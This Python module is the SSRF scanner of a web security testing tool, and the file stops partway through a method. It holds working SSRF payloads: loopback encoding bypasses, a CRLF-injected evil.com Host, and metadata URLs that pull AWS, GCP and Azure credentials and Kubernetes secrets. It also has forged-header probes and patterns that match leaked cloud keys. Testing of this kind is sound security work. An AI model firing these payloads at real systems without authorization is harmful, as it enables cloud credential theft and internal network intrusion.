"""
Server-Side Request Forgery (SSRF) Scanner
===========================================
Comprehensive SSRF detection covering:
  - URL-like parameter name heuristics + value-based URL detection
  - Localhost / loopback variants (decimal, octal, hex, IPv6, aliases)
  - Cloud metadata endpoints: AWS IMDSv1/v2, GCP, Azure, DigitalOcean,
    Alibaba Cloud, Kubernetes service account API
  - Internal service probing: Consul, Vault, etcd, Docker API,
    Elasticsearch, Redis, Jenkins, Grafana, Spring Actuator
  - Alternative protocol smuggling: dict://, gopher://, file://, ldap://,
    sftp://, netdoc://
  - Header injection SSRF: Host, X-Forwarded-Host, X-Original-URL,
    X-Forwarded-For, X-Real-IP
  - DNS rebinding / open-redirect chain detection
  - Response-body metadata pattern matching (High confidence)
  - Error-based SSRF confirmation (Medium confidence)
  - Response-time anomaly hints (Low confidence)
  - Blind SSRF advisory finding (Info)

CWE  : CWE-918 (Server-Side Request Forgery)
OWASP: A10:2021 – Server-Side Request Forgery (SSRF)
CVSS : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N  (base 9.3 → Critical)
"""
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║  WebShield — Advanced Web Application Security Scanner                  ║
# ║  Copyright (c) 2026 علاء محمود البدوي (Alaa Mahmoud El-Badawi)         ║
# ║  All rights reserved. For authorized security research only.            ║
# ╚══════════════════════════════════════════════════════════════════════════╝

from __future__ import annotations

import re
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Sequence, Tuple
from urllib.parse import urlparse

from .base_scanner import BaseScanner
try:
    from ..recon.intelligence_bridge import IntelligenceAwareScanner as _ScannerBase
except Exception:
    _ScannerBase = BaseScanner
from ..core.http_client import HTTPResponse
from ..models.vulnerability import (
    Vulnerability,
    Severity,
    VulnType,
    CVSSv3,
    AttackVector,
    AttackComplexity,
    PrivilegesRequired,
    UserInteraction,
    Scope,
    Impact,
)
from ..utils.payloads import (
    SSRF_PAYLOADS,
    SSRF_CLOUD_METADATA,
    SSRF_BYPASS_ENCODINGS,
    SSRF_INTERNAL_SERVICES,
    SSRF_PROTOCOL_BYPASSES,
)
from ..utils.patterns import SSRF_RESPONSE_PATTERNS

# ---------------------------------------------------------------------------
# CVSS profiles used in findings
# ---------------------------------------------------------------------------

_CVSS_SSRF_HIGH = CVSSv3(
    attack_vector=AttackVector.NETWORK,
    attack_complexity=AttackComplexity.LOW,
    privileges_required=PrivilegesRequired.NONE,
    user_interaction=UserInteraction.NONE,
    scope=Scope.CHANGED,
    confidentiality=Impact.HIGH,
    integrity=Impact.LOW,
    availability=Impact.NONE,
)  # → CVSS 9.3 / Critical

_CVSS_SSRF_MEDIUM = CVSSv3(
    attack_vector=AttackVector.NETWORK,
    attack_complexity=AttackComplexity.HIGH,
    privileges_required=PrivilegesRequired.NONE,
    user_interaction=UserInteraction.NONE,
    scope=Scope.CHANGED,
    confidentiality=Impact.LOW,
    integrity=Impact.NONE,
    availability=Impact.NONE,
)  # → CVSS 4.0 / Medium  (error-based / timing)

_CVSS_SSRF_HEADER = CVSSv3(
    attack_vector=AttackVector.NETWORK,
    attack_complexity=AttackComplexity.HIGH,
    privileges_required=PrivilegesRequired.NONE,
    user_interaction=UserInteraction.NONE,
    scope=Scope.CHANGED,
    confidentiality=Impact.HIGH,
    integrity=Impact.LOW,
    availability=Impact.NONE,
)  # → CVSS 7.5 / High  (header injection)

# ---------------------------------------------------------------------------
# Shared remediation / references
# ---------------------------------------------------------------------------

_REMEDIATION = (
    "1. Implement a strict allowlist of permitted schemes (https only) and "
    "destination hosts/domains. Deny all RFC-1918 and link-local ranges by "
    "default.\n"
    "2. Resolve the supplied URL and re-validate the resolved IP address "
    "against the allowlist (prevent DNS rebinding).\n"
    "3. Use a dedicated egress proxy (e.g., Squid with ACLs) for all "
    "server-initiated outbound requests.\n"
    "4. Disable support for non-HTTP(S) URL schemes (file://, dict://, "
    "gopher://, ldap://, sftp://) if not required.\n"
    "5. Avoid returning raw server-fetched content directly to the client.\n"
    "6. Apply network-level controls: firewall the metadata service IP "
    "(169.254.169.254) from application subnets; prefer IMDSv2 (PUT-first) "
    "and configure hop-limit=1 to block SSRF-originated IMDSv1 requests."
)

_REFERENCES = [
    "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
    "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
    "https://cwe.mitre.org/data/definitions/918.html",
    "https://portswigger.net/web-security/ssrf",
    "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery",
]

_CWE = "CWE-918"
_OWASP = "A10:2021 - Server-Side Request Forgery (SSRF)"

# ---------------------------------------------------------------------------
# Parameter-name heuristic — names strongly suggestive of URL consumption
# ---------------------------------------------------------------------------

_URL_PARAM_NAME_RE = re.compile(
    r"(?i)\b("
    r"url|uri|path|src|source|dest(?:ination)?|redirect(?:_?url|_?to|_?uri)?|"
    r"return(?:_?url|_?to|_?uri|_?path)?|next|goto|location|link|href|ref(?:errer)?|"
    r"host|endpoint|api(?:_?url|_?endpoint)?|proxy(?:_?url)?|"
    r"file(?:_?url|_?path)?|resource|fetch|load|include|import|inject|"
    r"page|site|domain|callback|webhook|forward|feed|"
    r"img(?:_?url|_?src)?|image(?:_?url|_?src)?|"
    r"download(?:_?url)?|target|action|open|connect|ping|request(?:_?url)?"
    r")\b",
    re.IGNORECASE,
)

# Value looks like a URL the server may fetch
_URL_VALUE_RE = re.compile(
    r"^(?:https?|ftp|file)://",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# Extended metadata response patterns (complement SSRF_RESPONSE_PATTERNS)
# ---------------------------------------------------------------------------

_METADATA_BODY_PATTERNS: List[re.Pattern] = SSRF_RESPONSE_PATTERNS + [
    re.compile(p, re.IGNORECASE | re.DOTALL)
    for p in [
        # AWS-specific
        r"ami-[a-f0-9]{8,17}",                      # AMI ID   e.g. ami-0a1b2c3d
        r'"AccessKeyId"\s*:\s*"ASIA[A-Z0-9]{16}"',  # STS temporary key
        r'"SecretAccessKey"\s*:\s*"[A-Za-z0-9/+]{40}"',
        r'"Token"\s*:\s*"[A-Za-z0-9/+=]{100,}"',    # STS session token
        r"aws_access_key_id\s*=\s*[A-Z0-9]{16,}",   # credentials file
        r"aws_secret_access_key",
        r'"region"\s*:\s*"[a-z]{2}-[a-z]+-\d"',     # us-east-1 etc.
        r"latest/meta-data",
        r"latest/dynamic/instance-identity",
        # GCP-specific
        r'"email"\s*:.{0,40}\.gserviceaccount\.com',
        r'"access_token"\s*:\s*"ya29\.',              # GCP OAuth token
        r"computeMetadata/v1",
        r'"projectId"\s*:',
        # Azure-specific
        r'"access_token"\s*:\s*"eyJ[A-Za-z0-9._-]{40,}"',  # JWT-shaped Azure token
        r'"client_id"\s*:\s*"[0-9a-f-]{36}"',        # UUID-shaped client_id
        r'"MSI_ENDPOINT"',
        # Kubernetes
        r"kubernetes\.default\.svc",
        r'"serviceAccountName"',
        r"namespace.*kube-system",
        # Docker / Consul / Vault / etcd
        r'"ServerVersion"\s*:\s*"\d+\.\d+',           # Docker info
        r'"KVStore"\s*:',                              # Consul health
        r'"seal_type"\s*:',                            # Vault
        r'"etcdserver"',                               # etcd version
        # Elasticsearch
        r'"cluster_name"\s*:',
        r'"number_of_nodes"\s*:\s*\d',
        # Generic internal-service confirms
        r"Connection refused to 127\.",
        r"ECONNREFUSED 127\.",
        r"dial tcp 127\.",
    ]
]

# Error strings that prove the server made the outbound request (even if blocked)
_ERROR_SSRF_PATTERNS: List[re.Pattern] = [
    re.compile(p, re.IGNORECASE)
    for p in [
        r"connection refused",
        r"ECONNREFUSED",
        r"no route to host",
        r"network is unreachable",
        r"connection timed out",
        r"failed to connect",
        r"could not connect to",
        r"unable to connect",
        r"connect: connection refused",
        r"dial tcp.*:.*refused",
        r"getaddrinfo.*failed",
        r"name or service not known",
    ]
]

# ---------------------------------------------------------------------------
# Payload categories — tested in strict priority order
# ---------------------------------------------------------------------------

@dataclass
class _PayloadEntry:
    """One SSRF test payload with its metadata."""
    url: str
    category: str                        # "localhost" | "cloud" | "internal" | "protocol"
    extra_headers: Dict[str, str] = field(default_factory=dict)
    method: str = "GET"                  # some payloads need PUT (IMDSv2)
    description: str = ""


def _build_payload_queue() -> List[_PayloadEntry]:
    """
    Return all SSRF payloads ordered by category priority:
      1. Localhost variants
      2. Cloud metadata
      3. Internal services
      4. Protocol smuggling
    Within each category ordering matches severity/likelihood.
    """
    entries: List[_PayloadEntry] = []

    # ── Category A: Localhost / loopback ────────────────────────────────────
    localhost_urls = [
        "http://127.0.0.1",
        "http://127.0.0.1:80",
        "http://127.0.0.1:443",
        "http://127.0.0.1:8080",
        "http://127.0.0.1:8443",
        "http://127.0.0.1:22",
        "http://localhost",
        "http://localhost:80",
        "http://localhost:8080",
        "http://[::1]",
        "http://[::1]:80",
        "http://0.0.0.0",
        # Encoding variants (decimal / octal / hex / abbreviated)
        "http://2130706433",          # 127.0.0.1 decimal
        "http://0177.0.0.1",          # 127 octal
        "http://0x7f000001",          # 127.0.0.1 hex
        "http://0177.0.0x1",          # mixed
        "http://127.000.000.001",     # zero-padded
        "http://127.1",               # abbreviated
        "http://127.127.127.127",     # any 127.x is loopback
        "http://[::ffff:127.0.0.1]",  # IPv4-mapped IPv6
        "http://[::ffff:7f00:0001]",  # IPv4-mapped IPv6 hex
        "HTTP://LOCALHOST",           # uppercase scheme
        "http://127%252E0%252E0%252E1",  # double-encoded dots
        "http://attacker@127.0.0.1",     # user-info bypass
        "http://127.0.0.1%0d%0aHost:%20evil.com",  # CRLF injection
        "http://localtest.me",        # public DNS → 127.0.0.1
        "http://127.0.0.1.nip.io",   # nip.io wildcard
        "http://127-0-0-1.sslip.io", # sslip.io
    ]
    for u in localhost_urls:
        entries.append(_PayloadEntry(url=u, category="localhost",
                                     description="Localhost/loopback variant"))

    # ── Category B: Cloud metadata ──────────────────────────────────────────
    # AWS IMDSv1 (no token needed — if the server makes a plain GET it works)
    aws_v1 = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://169.254.169.254/latest/meta-data/ami-id",
        "http://169.254.169.254/latest/meta-data/public-keys/",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.170.2/v2/credentials/",  # Lambda
    ]
    for u in aws_v1:
        entries.append(_PayloadEntry(url=u, category="cloud",
                                     description="AWS IMDSv1"))

    # AWS IMDSv2 — requires PUT first to get token, then GET with token header.
    # We probe by sending PUT with TTL header; if the target reflects the response,
    # it confirms the server is executing the request.
    entries.append(_PayloadEntry(
        url="http://169.254.169.254/latest/api/token",
        category="cloud",
        method="PUT",
        extra_headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
        description="AWS IMDSv2 PUT token probe",
    ))

    # GCP (must include Metadata-Flavor: Google to get a real response)
    gcp_urls = [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://metadata.google.internal/computeMetadata/v1/instance/id",
    ]
    for u in gcp_urls:
        entries.append(_PayloadEntry(
            url=u, category="cloud",
            extra_headers={"Metadata-Flavor": "Google"},
            description="GCP metadata",
        ))

    # Azure
    azure_urls = [
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
        "&resource=https://management.azure.com/",
    ]
    for u in azure_urls:
        entries.append(_PayloadEntry(
            url=u, category="cloud",
            extra_headers={"Metadata": "true"},
            description="Azure IMDS",
        ))

    # DigitalOcean
    entries.append(_PayloadEntry(
        url="http://169.254.169.254/metadata/v1.json",
        category="cloud",
        description="DigitalOcean metadata",
    ))

    # Alibaba Cloud
    entries.append(_PayloadEntry(
        url="http://100.100.100.200/latest/meta-data/",
        category="cloud",
        description="Alibaba Cloud metadata",
    ))

    # Kubernetes service account API
    k8s_urls = [
        "https://kubernetes.default.svc/api/v1/",
        "https://kubernetes.default.svc/api/v1/secrets",
        "https://kubernetes.default.svc/api/v1/namespaces",
        "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
    ]
    for u in k8s_urls:
        entries.append(_PayloadEntry(url=u, category="cloud",
                                     description="Kubernetes API"))

    # Encoding bypass of 169.254.169.254
    metadata_enc = [
        "http://2852039166",              # decimal
        "http://0251.0376.0251.0376",     # octal
        "http://0xa9fea9fe",              # hex
        "http://[0:0:0:0:0:ffff:169.254.169.254]",  # IPv4-in-IPv6
    ]
    for u in metadata_enc:
        entries.append(_PayloadEntry(url=u, category="cloud",
                                     description="Metadata IP encoding bypass"))

    # ── Category C: Internal services ───────────────────────────────────────
    for u in SSRF_INTERNAL_SERVICES:
        entries.append(_PayloadEntry(url=u, category="internal",
                                     description="Internal service probe"))

    # ── Category D: Protocol smuggling ──────────────────────────────────────
    for u in SSRF_PROTOCOL_BYPASSES:
        entries.append(_PayloadEntry(url=u, category="protocol",
                                     description="Alternative protocol"))

    return entries


_PAYLOAD_QUEUE: List[_PayloadEntry] = _build_payload_queue()

# Headers to forge in header-injection tests
_SSRF_HOST_HEADERS: List[Tuple[str, str]] = [
    ("Host",              "169.254.169.254"),
    ("Host",              "metadata.google.internal"),
    ("X-Forwarded-Host",  "169.254.169.254"),
    ("X-Forwarded-Host",  "metadata.google.internal"),
    ("X-Original-URL",    "http://169.254.169.254/latest/meta-data/"),
    ("X-Rewrite-URL",     "http://169.254.169.254/latest/meta-data/"),
    ("X-Forwarded-For",   "169.254.169.254"),
    ("X-Real-IP",         "169.254.169.254"),
    ("Client-IP",         "169.254.169.254"),
    ("True-Client-IP",    "169.254.169.254"),
    ("X-Forwarded-Host",  "127.0.0.1"),
    ("X-Original-URL",    "http://127.0.0.1:8080/admin"),
]

# Timing: how much faster than baseline triggers a Low-confidence flag
_TIMING_SPEEDUP_FACTOR = 2.5   # internal response ≥ 2.5× faster than baseline
_TIMING_SLOWDOWN_FACTOR = 3.0  # internal response ≥ 3× slower (connection hang)
_TIMING_MIN_BASELINE_MS = 50   # ignore timing if baseline is too fast to be meaningful
_TIMING_MIN_ABS_DELTA_S = 1.0  # floor added on top of 3*std_dev so a near-zero
                               # std_dev (very stable baseline) doesn't produce
                               # a threshold that's basically equal to the
                               # baseline itself — avoids flagging normal jitter


# ===========================================================================
# SSRFScanner
# ===========================================================================

class SSRFScanner(_ScannerBase):
    """
    Multi-vector SSRF scanner.

    Detection flow per URL:
      1. Identify candidate parameters (name-heuristic + value-URL detection).
      2. Establish a per-parameter response baseline (benign value).
      3. For each candidate, iterate payload categories in order; stop the
         category loop for that parameter on the first confirmed hit.
      4. Test header-injection SSRF vectors against the base URL.
      5. If at least one URL parameter exists but none triggered, emit an
         INFO advisory about blind SSRF / callback-based testing.
    """

    name = "SSRF"

    # -----------------------------------------------------------------------
    # Public entry point (BaseScanner interface)
    # -----------------------------------------------------------------------

    async def scan_url(
        self,
        url: str,
        response: HTTPResponse,
        forms: List[Dict[str, Any]],
    ) -> List[Vulnerability]:
        vulns: List[Vulnerability] = []
        seen_params: set = set()

        # ── Collect candidate parameters ────────────────────────────────────
        candidates = self._collect_candidates(url, response)

        # ── Test each candidate parameter ───────────────────────────────────
        for param, original_value in candidates:
            if param in seen_params:
                continue
            seen_params.add(param)

            baseline_time = await self._measure_baseline(url, param, original_value)
            findings = await self._test_param(
                url, param, original_value, baseline_time, method="GET"
            )
            vulns.extend(findings)

        # ── Test form inputs ─────────────────────────────────────────────────
        for form in forms:
            for inp in form.get("inputs", []):
                name = inp.get("name", "")
                value = inp.get("value", "")
                if not name or name in seen_params:
                    continue
                if not (
                    _URL_PARAM_NAME_RE.search(name)
                    or _URL_VALUE_RE.match(value)
                ):
                    continue
                seen_params.add(name)
                findings = await self._test_form_param(form, name, url)
                vulns.extend(findings)
                if findings:
                    break  # one confirmed finding per form is enough

        # ── Header-injection SSRF ────────────────────────────────────────────
        header_vulns = await self._test_header_injection(url, response)
        vulns.extend(header_vulns)

        # ── JSON body SSRF (REST APIs) ──────────────────────────────────────
        if not vulns:
            ct = (response.content_type or "").lower()
            if "json" in ct:
                json_vulns = await self._test_json_body_ssrf(url, response)
                vulns.extend(json_vulns)

        # ── Blind SSRF advisory (INFO) ───────────────────────────────────────
        # Only emit advisory when:
        # 1. At least one candidate param has a VALUE that is already a URL
        #    (strong signal the server fetches it)  OR
        # 2. The param name is a very strong SSRF indicator (proxy, webhook,
        #    endpoint, callback) AND current value is not empty.
        # This avoids spamming advisory on every page with ?redirect=/ or ?next=/login
        _STRONG_SSRF_PARAMS = re.compile(
            r"(?i)\b(proxy|webhook|callback|endpoint|api[_\-]?url|"
            r"fetch|load|import|include|inject|resource|request[_\-]?url)\b"
        )
        high_value_candidates = [
            p for p, v in candidates
            if _URL_VALUE_RE.match(v)                     # value IS a URL
            or _STRONG_SSRF_PARAMS.search(p)              # name is high-signal
        ]

        confirmed_count = sum(1 for v in vulns
                              if v.vuln_type == VulnType.SSRF
                              and v.severity not in (Severity.INFO,))
        if high_value_candidates and confirmed_count == 0:
            vulns.append(self._blind_ssrf_advisory(url, high_value_candidates))

        return vulns

    # -----------------------------------------------------------------------
    # Candidate parameter collection
    # -----------------------------------------------------------------------

    def _collect_candidates(
        self, url: str, response: HTTPResponse
    ) -> List[Tuple[str, str]]:
        """
        Return (param_name, current_value) pairs that are candidate SSRF sinks.
        Criteria:
          a) Parameter name matches the URL-param heuristic regex.
          b) Parameter current value starts with http/https/ftp/file.
        """
        from ..utils.helpers import extract_params

        raw = extract_params(url)
        candidates: List[Tuple[str, str]] = []
        seen: set = set()

        for name, values in raw.items():
            current = values[0] if values else ""
            if name in seen:
                continue
            seen.add(name)
            if _URL_PARAM_NAME_RE.search(name) or _URL_VALUE_RE.match(current):
                candidates.append((name, current))

        return candidates

    # -----------------------------------------------------------------------
    # Baseline timing measurement
    # -----------------------------------------------------------------------

    async def _measure_baseline(
        self, url: str, param: str, original_value: str
    ) -> float:
        """
        Fix 3.3: Statistical baseline using multiple samples.
        Returns mean response time. Used with _is_timing_anomaly() for
        3-sigma threshold instead of simple multiplier — reduces FP from
        normal network jitter.
        """
        _BASELINE_SAMPLES = 3
        times: List[float] = []
        for _ in range(_BASELINE_SAMPLES):
            benign_url = self._inject_param(url, param, original_value or "https://example.com")
            start = time.monotonic()
            resp = await self.client.get(benign_url)
            if resp is not None:
                times.append(time.monotonic() - start)

        if not times:
            return 0.0
        return sum(times) / len(times)

    def _baseline_std_dev(self, times: List[float]) -> float:
        if len(times) < 2:
            return 0.0
        mean = sum(times) / len(times)
        variance = sum((t - mean) ** 2 for t in times) / len(times)
        return variance ** 0.5

    # -----------------------------------------------------------------------
    # Parameter-level SSRF testing
    # -----------------------------------------------------------------------

    async def _test_param(
        self,
        url: str,
        param: str,
        original_value: str,
        baseline_time: float,
        method: str,
    ) -> List[Vulnerability]:
        """
        Test a single URL query parameter against all payload categories.
        Returns at most one finding per category before moving to the next.
        Stops across categories on first High-confidence hit.
        """
        results: List[Vulnerability] = []
        categories_done: set = set()
        high_found = False

        for entry in _PAYLOAD_QUEUE:
            if high_found:
                break
            cat = entry.category
            if cat in categories_done:
                continue  # already got a finding for this category

            injected_url = self._inject_param(url, param, entry.url)

            # Merge any payload-specific extra headers
            req_headers = dict(entry.extra_headers) if entry.extra_headers else None

            start = time.monotonic()
            if entry.method == "PUT":
                resp = await self.client.request(
                    "PUT", injected_url, headers=req_headers
                )
            else:
                resp = await self.client.get(injected_url, headers=req_headers)
            elapsed = time.monotonic() - start

            if resp is None:
                continue

            # ── Detection: body-match (High) ─────────────────────────────
            body_evidence = self._check_metadata_body(resp)
            if body_evidence:
                categories_done.add(cat)
                vuln = self._make_vuln(
                    url=url,
                    param=param,
                    payload=entry.url,
                    method=method,
                    evidence=body_evidence,
                    confidence="High",
                    severity=None,   # derive from CVSS
                    cvss=_CVSS_SSRF_HIGH,
                    category=cat,
                    description_extra=entry.description,
                    response_snippet=self._snippet(resp.text),
                )
                results.append(vuln)
                high_found = True
                continue

            # ── Detection: error-based (Medium) ──────────────────────────
            # Only meaningful for localhost/loopback payloads — proving the
            # server attempted the connection even though it was refused.
            if cat == "localhost":
                error_evidence = self._check_error_based(resp, entry.url)
                if error_evidence:
                    categories_done.add(cat)
                    vuln = self._make_vuln(
                        url=url,
                        param=param,
                        payload=entry.url,
                        method=method,
                        evidence=error_evidence,
                        confidence="Medium",
                        severity=Severity.MEDIUM,
                        cvss=_CVSS_SSRF_MEDIUM,
                        category=cat,
                        description_extra=(
                            "Error response confirms the server made the "
                            "outbound request. The connection was refused by "
                            "the target, but SSRF is confirmed."
                        ),
                        response_snippet=self._snippet(resp.text),
                    )
                    results.append(vuln)
                    continue  # medium — keep scanning other categories

            # ── Detection: status-code difference (Medium) ────────────────
            # If we get 200 for an SSRF payload but baseline is 4xx it is
            # suspicious; require either body match OR error to avoid FP —
            # we skip a bare-200 heuristic entirely (see requirement §8).

            # ── Detection: response-time anomaly (Low) ────────────────────
            if baseline_time >= (_TIMING_MIN_BASELINE_MS / 1000.0):
                timing_note = self._check_timing_anomaly(
                    entry.url, elapsed, baseline_time
                )
                if timing_note and cat not in categories_done:
                    # Do NOT add to categories_done — timing is Low confidence
                    # and we still want to fully test this category.
                    vuln = self._make_vuln(
                        url=url,
                        param=param,
                        payload=entry.url,
                        method=method,
                        evidence=timing_note,
                        confidence="Low",
                        severity=Severity.LOW,
                        cvss=_CVSS_SSRF_MEDIUM,
                        category=cat,
                        description_extra=(
                            "Response time anomaly detected. This may indicate "
                            "the server is routing requests to an internal "
                            "service. Confirm with manual testing or a callback "
                            "server (Burp Collaborator / interactsh)."
                        ),
                        response_snippet=self._snippet(resp.text),
                    )
                    results.append(vuln)

            # ── Detection: DNS rebinding / open-redirect reflection ───────
            reflect_evidence = self._check_url_reflection(resp, entry.url, original_value)
            if reflect_evidence and cat not in categories_done:
                vuln = self._make_vuln(
                    url=url,
                    param=param,
                    payload=entry.url,
                    method=method,
                    evidence=reflect_evidence,
                    confidence="Low",
                    severity=Severity.LOW,
                    cvss=_CVSS_SSRF_MEDIUM,
                    category=cat,
                    description_extra=(
                        "The server reflects the supplied URL value unmodified. "
                        "If combined with an open redirect, this can be chained "
                        "into a full SSRF via DNS rebinding."
                    ),
                    response_snippet=self._snippet(resp.text),
                )
                results.append(vuln)

        return results

    # -----------------------------------------------------------------------
    # Form-parameter SSRF testing
    # -----------------------------------------------------------------------

    async def _test_form_param(
        self,
        form: Dict[str, Any],
        param_name: str,
        page_url: str,
    ) -> List[Vulnerability]:
        """Test an HTML form field for SSRF."""
        action = form.get("action", page_url)
        method = form.get("method", "GET").upper()

        # Use a reduced subset for forms to keep request count reasonable
        form_payloads = [
            p for p in _PAYLOAD_QUEUE
            if p.category in ("localhost", "cloud")
        ][:20]

        for entry in form_payloads:
            form_data = {
                inp["name"]: (
                    entry.url if inp["name"] == param_name
                    else inp.get("value", "test")
                )
                for inp in form.get("inputs", [])
                if inp.get("name")
            }

            req_headers = dict(entry.extra_headers) if entry.extra_headers else None

            if method == "POST":
                resp = await self.client.post(action, data=form_data,
                                              headers=req_headers)
            else:
                resp = await self.client.get(action, params=form_data,
                                             headers=req_headers)

            if resp is None:
                continue

            body_evidence = self._check_metadata_body(resp)
            if body_evidence:
                return [self._make_vuln(
                    url=action,
                    param=param_name,
                    payload=entry.url,
                    method=method,
                    evidence=body_evidence,
                    confidence="High",
                    severity=None,
                    cvss=_CVSS_SSRF_HIGH,
                    category=entry.category,
                    description_extra=f"Detected via form field. {entry.description}",
                    response_snippet=self._snippet(resp.text),
                )]

            error_evidence = self._check_error_based(resp, entry.url)
            if error_evidence and entry.category == "localhost":
                return [self._make_vuln(
                    url=action,
                    param=param_name,
                    payload=entry.url,
                    method=method,
                    evidence=error_evidence,
                    confidence="Medium",
                    severity=Severity.MEDIUM,
                    cvss=_CVSS_SSRF_MEDIUM,
                    category=entry.category,
                    description_extra="Error-based SSRF via form field.",
                    response_snippet=self._snippet(resp.text),
                )]

        return []

    # -----------------------------------------------------------------------
    # Header-injection SSRF
    # -----------------------------------------------------------------------

    async def _test_header_injection(
        self, url: str, baseline_response: HTTPResponse
    ) -> List[Vulnerability]:
        """
        Forge Host / X-Forwarded-Host / X-Original-URL headers pointing to
        internal IPs.  Only report when metadata body evidence is confirmed.
        Response-diff alone is NOT sufficient — too many false positives.
        """
        vulns: List[Vulnerability] = []

        # Negative control: what metadata-shaped patterns (if any) already
        # appear on this page with NO forged header at all? If the same
        # pattern is present in the baseline, it's static content (e.g. an
        # already-exposed secrets file) — not evidence that the forged
        # header caused a new internal request.
        baseline_evidence = self._check_metadata_body(baseline_response)

        for header_name, header_value in _SSRF_HOST_HEADERS:
            forged = {header_name: header_value}
            resp = await self.client.get(url, headers=forged)
            if resp is None:
                continue

            # ONLY report on confirmed metadata body evidence (High confidence)
            # Never report on response diff alone — that produces too many FPs
            body_evidence = self._check_metadata_body(resp)
            if body_evidence and body_evidence == baseline_evidence:
                # Same evidence string already present without any forged
                # header — this page always looks like this, so the header
                # didn't cause anything new. Not a finding.
                continue
            if body_evidence:
                vulns.append(self._build_vuln(
                    vuln_type=VulnType.SSRF,
                    title="SSRF via HTTP Header Injection (Confirmed)",
                    description=(
                        f"Forging the '{header_name}: {header_value}' header "
                        f"caused the server to issue an internal request that "
                        f"returned metadata content in the response body. "
                        f"This confirms the server uses this header for routing."
                    ),
                    url=url,
                    parameter=header_name,
                    payload=f"{header_name}: {header_value}",
                    evidence=body_evidence,
                    method="GET",
                    confidence="High",
                    cvss=_CVSS_SSRF_HEADER,
                    remediation=_REMEDIATION,
                    references=_REFERENCES,
                    cwe_id=_CWE,
                    owasp_category=_OWASP,
                    response_snippet=self._snippet(resp.text),
                ))
                break  # one confirmed finding per URL is sufficient

        return vulns

    # -----------------------------------------------------------------------
    # Detection helpers
    # -----------------------------------------------------------------------

    def _check_metadata_body(self, response: HTTPResponse) -> Optional[str]:
        """
        Return a short evidence string if the response body contains
        cloud/internal metadata indicators.  Returns None on no match.
        This is the primary High-confidence signal.
        """
        body = response.text
        for pat in _METADATA_BODY_PATTERNS:
            m = pat.search(body)
            if m:
                snippet = m.group(0)[:120].strip()
                return f"Metadata indicator in body: '{snippet}'"
        return None

    def _check_error_based(
        self, response: HTTPResponse, payload: str
    ) -> Optional[str]:
        """
        Return evidence if the response contains error strings that confirm
        the server made (and was blocked from) an outbound TCP connection.
        Only meaningful for payloads targeting localhost/loopback.
        """
        # Only check when payload targets a loopback address
        parsed = urlparse(payload)
        host = (parsed.hostname or "").lower()
        loopback_hosts = {"127.0.0.1", "localhost", "[::1]", "0.0.0.0",
                          "::1", "2130706433", "0177.0.0.1", "0x7f000001"}
        if host not in loopback_hosts and not host.startswith("127."):
            return None

        body = response.text
        for pat in _ERROR_SSRF_PATTERNS:
            m = pat.search(body)
            if m:
                return (
                    f"Server-side connection error confirms outbound request "
                    f"was attempted: '{m.group(0)[:100]}'"
                )
        return None

    def _check_timing_anomaly(
        self, payload: str, elapsed: float, baseline: float,
        std_dev: float = 0.0,
    ) -> Optional[str]:
        """
        Fix 3.3: Statistical timing anomaly detection.
        Uses 3-sigma threshold when std_dev is available — avoids FP from
        network jitter. Falls back to multiplier-based check otherwise.
        """
        if baseline <= 0:
            return None

        # Minimum baseline — skip if too fast (jitter would dominate)
        if baseline < (_TIMING_MIN_BASELINE_MS / 1000.0):
            return None

        # 3-sigma upper threshold (99.7% confidence)
        sigma_threshold = baseline + max(3 * std_dev, _TIMING_MIN_ABS_DELTA_S)

        if elapsed >= sigma_threshold:
            return (
                f"Response {elapsed * 1000:.0f}ms exceeds 3σ threshold "
                f"({sigma_threshold * 1000:.0f}ms; baseline={baseline * 1000:.0f}ms, "
                f"σ={std_dev * 1000:.0f}ms). "
                f"Abnormal delay may indicate the server is attempting to "
                f"reach an internal host."
            )

        # Fast response (internal routing — less reliable signal, keep for info)
        if baseline > 0:
            ratio = elapsed / baseline
            if ratio <= (1.0 / _TIMING_SPEEDUP_FACTOR):
                return (
                    f"Response {ratio:.1f}× faster than baseline "
                    f"({elapsed * 1000:.0f}ms vs {baseline * 1000:.0f}ms). "
                    f"Fast response to internal payload may indicate successful "
                    f"internal routing."
                )
        return None

    def _check_url_reflection(
        self, response: HTTPResponse, payload: str, original_value: str
    ) -> Optional[str]:
        """
        Detect if the server reflects a URL value from the parameter back
        unmodified in the response body (potential open-redirect chain /
        DNS rebinding pivot).  Only flags if the *SSRF payload* URL appears
        verbatim (not merely the original value).
        """
        if not payload.startswith(("http://", "https://")):
            return None
        parsed = urlparse(payload)
        host = parsed.netloc or ""
        if not host:
            return None
        body = response.text
        # Check if the exact injected host or full URL appears in the body
        if host in body or payload in body:
            return (
                f"Server reflects injected URL/host '{host}' unmodified. "
                f"May be chained with an open redirect for SSRF via DNS rebinding."
            )
        return None

    # -----------------------------------------------------------------------
    # Vulnerability builders
    # -----------------------------------------------------------------------

    def _make_vuln(
        self,
        url: str,
        param: str,
        payload: str,
        method: str,
        evidence: str,
        confidence: str,
        severity: Optional[Severity],
        cvss: Optional[CVSSv3],
        category: str,
        description_extra: str,
        response_snippet: Optional[str] = None,
    ) -> Vulnerability:
        """Build a Vulnerability for a confirmed SSRF in a URL/form parameter."""
        category_labels = {
            "localhost": "localhost/loopback IP",
            "cloud":     "cloud metadata endpoint",
            "internal":  "internal service endpoint",
            "protocol":  "alternative protocol",
        }
